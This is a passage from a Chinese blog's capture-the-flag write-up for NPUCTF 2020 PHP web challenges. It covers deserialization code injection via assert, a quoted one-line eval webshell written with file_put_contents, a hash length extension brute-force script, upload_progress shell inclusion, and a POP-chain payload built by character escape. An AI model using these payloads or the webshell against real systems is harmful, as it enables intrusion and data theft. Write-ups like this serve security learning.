@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="liduoan.efls">
+    
+    <title>
+        
+            NPUCTF-WP |
+        
+        liduoan修炼笔记
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="https://i.postimg.cc/MpmSbVgT/4-U-3-AU-6-0-R8-L6-K5658-H.jpg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"https://i.postimg.cc/MpmSbVgT/4-U-3-AU-6-0-R8-L6-K5658-H.jpg","favicon":"https://i.postimg.cc/MpmSbVgT/4-U-3-AU-6-0-R8-L6-K5658-H.jpg","avatar":"https://i.postimg.cc/MpmSbVgT/4-U-3-AU-6-0-R8-L6-K5658-H.jpg","font_size":null,"font_family":"STSong","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"世之奇伟、瑰怪，非常之观，常在于险远 || 而人之所罕至焉，故非有志者不能至也","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="https://i.postimg.cc/MpmSbVgT/4-U-3-AU-6-0-R8-L6-K5658-H.jpg">
+                </a>
+            
+            <a class="logo-title" href="/">
+               liduoan修炼笔记
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">NPUCTF-WP</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="https://i.postimg.cc/MpmSbVgT/4-U-3-AU-6-0-R8-L6-K5658-H.jpg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">liduoan.efls</span>
+                            
+                                <span class="author-label">Lv4</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2020-04-24 17:06:51</span>
+        <span class="mobile">2020-04-24 17:06</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2020-04-26 13:16:55</span>
+    </span>
+    
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E5%88%B7%E9%A2%98/">刷题</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.7k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>7 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <h2 id="NPUCTF-4-18-4-21"><a href="#NPUCTF-4-18-4-21" class="headerlink" title="NPUCTF   4.18-4.21"></a>NPUCTF   4.18-4.21</h2><p>很真实的运维赛，【滑稽</p>
+<p>web题好难。好吧是我太菜啦</p>
+<p>就写出来两道题目。。</p>
+<span id="more"></span>
+
+<h3 id="审查源码"><a href="#审查源码" class="headerlink" title="审查源码"></a>审查源码</h3><p>F5 鼠标右键不行</p>
+<p>直接<code>view-source:url</code>就行了</p>
+<p>甚至你还可以抓包来看。</p>
+<h3 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h3><p>这道题目有点坑。不过也确实学到了东西</p>
+<p>考点： 代码注入 反序列化  </p>
+<p>查看源码知道</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img-blog.csdnimg.cn/2020042417144223.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
+                      alt="img"
+                ></p>
+<p>那么我们打开看到源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">HelloPhp</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$ppp</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>很明显的反序列化执行。这里的构造函数<code>__construce()</code>在反序列化的时候是不会执行的，所以不必担心。</p>
+<p>那么下面就是代码注入的环节了。我发现他禁掉了好多的函数。</p>
+<p>最后测试出来使用 <code>assert</code>来进行代码注入。</p>
+<p>先利用<code>assert(&quot;phpinfo();&quot;);</code>来看看被禁掉了哪些函数</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img-blog.csdnimg.cn/2020042417182371.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
+                      alt="img"
+                ></p>
+<p>确实 大多数的执行系统命令的函数都被过滤了。。</p>
+<p>按照惯例，先看下目录。 这里不能使用系统命令。所以我们使用<code>scandir</code>函数</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img-blog.csdnimg.cn/20200424172024394.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
+                      alt="img"
+                ></p>
+<p>查看文件内容，除了系统命令，那就直接<code>file_get_contents()</code>来进行</p>
+<p>结果查出来的是个假的flag。真的无聊。</p>
+<p>然后我还翻遍大部分的文件。。</p>
+<p>最后想着有没有可能在phpinfo中有。然后查询一下。。。果然</p>
+<p>小tips：flag有可能会在phpinfo中，以后找到可以先查查看看。</p>
+<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>看了天璇的wp</p>
+<p>发现可以写马进去</p>
+<p>具体利用方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(&quot;eki.php&quot;, &quot;&lt;?php eval(\$_REQUEST[\&#x27;cmd\&#x27;]); ?&gt;&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>但是<code>eval</code>被禁止了呀。然而蚁剑的插件似乎可以绕过disabled_function</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/195686?from=timeline" >https://www.anquanke.com/post/id/195686?from=timeline<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h3><p>这是一位师傅的wp</p>
+<p>不太懂。。 我得去学学hash扩展攻击</p>
+<hr>
+<p>第一层又双叒叕是一个hash拓展攻击，没有长度就爆破一下</p>
+<p>利用 <code>upload_progress</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import hashpumpy</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=&#x27;http://ha1cyon-ctf.fun:30004/&#x27;</span><br><span class="line"></span><br><span class="line">for i in range(40):</span><br><span class="line">    a,b=hashpumpy.hashpump(&#x27;a3dabbc779f2fbf8b6f56113ca78a7f9&#x27;,&#x27;123444&#x27;,&#x27;1&#x27;,i)</span><br><span class="line"></span><br><span class="line">    req=requests.get(url+&quot;name=&#123;&#125;&amp;pass=&#123;&#125;&quot;.format(urllib.parse.quote(b),a))</span><br><span class="line">    if &#x27;username/password error&#x27; not in req.text:</span><br><span class="line">        print(req.text,url+&quot;name=&#123;&#125;&amp;pass=&#123;&#125;&quot;.format(urllib.parse.quote(b),a))</span><br><span class="line">        </span><br></pre></td></tr></table></figure>
+
+<p>跳到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flflflflag.php</span><br></pre></td></tr></table></figure>
+
+<p>可以文件包含</p>
+<p>这里是用 <code>upload_progress</code>来写shell，然后包含</p>
+<p><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/34f390cee1c39d3264d04a01c02c64896fe97016/687474703a2f2f6d6f306e2e746f702f696d616765732f68613163796f6e2f7068702d75706c6f61642d70726f67726573732e706e67"><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://camo.githubusercontent.com/34f390cee1c39d3264d04a01c02c64896fe97016/687474703a2f2f6d6f306e2e746f702f696d616765732f68613163796f6e2f7068702d75706c6f61642d70726f67726573732e706e67"
+                      alt="img"
+                ></a></p>
+<p>然后包含&#x2F;tmp&#x2F;m0on getshell，好像flag又是在phpinfo里面，根目录的是假的</p>
+<p>flag:</p>
+<p>flag{6b671cf1-9558-47f6-9cd2-46ff8e32a3e9}</p>
+<h2 id="安恒的-Ezunserialize"><a href="#安恒的-Ezunserialize" class="headerlink" title="安恒的 Ezunserialize"></a>安恒的 Ezunserialize</h2><p>一进去，直接源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//show_source(&quot;test.php&quot;);</span></span><br><span class="line"><span class="comment">//写函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//chr(0)==NULL</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . <span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//读函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\0\0\0&#x27;</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . <span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="comment">//构造函数确定</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="comment">//析构函数输出</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&#x27;gay&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="string">&#x27;a&#x27;</span>.<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="comment">//这里利用字符串输出文件  需要一个echo调用——toString</span></span><br><span class="line">    <span class="comment">// B类析构函数可以这样  也就是说 B类中的是</span></span><br><span class="line">    <span class="comment">//从A类进去</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//flag.php</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;c);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;nice&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="comment">//省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">read</span>(<span class="title function_ invoke__">write</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>))));</span><br></pre></td></tr></table></figure>
+
+<p>那么思路挺清楚的。A类一开始赋值。之后序列化A类，再反序列化A类。</p>
+<p>那么就应该是 在赋值A类的时候，是字符串。在反序列化的时候，把字符串返回来的时候也要把B类给反序列化出来。</p>
+<p>可是序列化A类之后的字符串是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">string(116) &quot;O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:2:&quot;li&quot;;s:8:&quot;password&quot;;s:57:&quot;;&#125;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;       &quot;%00;&#125;&quot;</span><br><span class="line">也就是</span><br><span class="line">O:1:&quot;A&quot;:2&#123;</span><br><span class="line">s:8:&quot;username&quot;;</span><br><span class="line">s:2:&quot;li&quot;;</span><br><span class="line">s:8:&quot;password&quot;;</span><br><span class="line">s:57:&quot;;&#125;   //这里字符数限制了反序列化解析的时候字符控制，</span><br><span class="line">O:1:&quot;B&quot;:1:&#123;</span><br><span class="line">s:1:&quot;b&quot;;</span><br><span class="line">O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br><span class="line">&#125;</span><br><span class="line">%00&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>他这里 我们在GET参数进去的时候就已经确定了自己是字符串。</p>
+<p>那么在序列化的时候，也确实两者是字符串。</p>
+<p>所以我们的目的是改变他认为这个是字符串！！</p>
+<hr>
+<p>按照颖奇师傅的wp</p>
+<p>我们要这么构造pop链</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;c=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;b=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;username=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;password=<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这样之后就可以得到序列化后的字符串</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img-blog.csdnimg.cn/20200426123804451.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>即是：<code>O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;1&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;</code></p>
+<p>分解一下看一下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;                   头类</span><br><span class="line">s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;				属性</span><br><span class="line">s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;					字符串值</span><br><span class="line">s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;				属性</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">1</span>:&#123;					类</span><br><span class="line">	s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;				</span><br><span class="line">	O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>:&#123;				</span><br><span class="line">		s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是我们输入的时候会被默认字符串 也就是说 不能被解析为类！ 这咋办呢？</p>
+<h3 id="字符逃逸d"><a href="#字符逃逸d" class="headerlink" title="字符逃逸d"></a>字符逃逸d</h3><p>这里的字符逃逸是怎么回事呢？</p>
+<p>看看write和read的代码先:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//写函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//chr(0)==NULL</span></span><br><span class="line">    <span class="comment">//如果有*的话 就改成 \0\0\0  </span></span><br><span class="line">    <span class="comment">//也就是说 三个字符变成 6个字符 拉长了</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . <span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//读函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">	<span class="comment">// //入宫有\0\0\0 那么我们就替换成 .*.这样的形式  </span></span><br><span class="line">	<span class="comment">//这个可以让我们把6个字符变成3个字符</span></span><br><span class="line">    <span class="comment">//牛逼</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\0\0\0&#x27;</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . <span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们看看<code>\0\0\0</code>和另外一个的字符长度！</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;\0\0\0&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;*&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里说 前者占6个字符的位置，后者占3个字符的位置。</p>
+<p>那么这就是字符逃逸了呀！</p>
+<p>借用颖奇师傅的wp用一下</p>
+<p><img  
+                     lazyload
+                     alt="image"
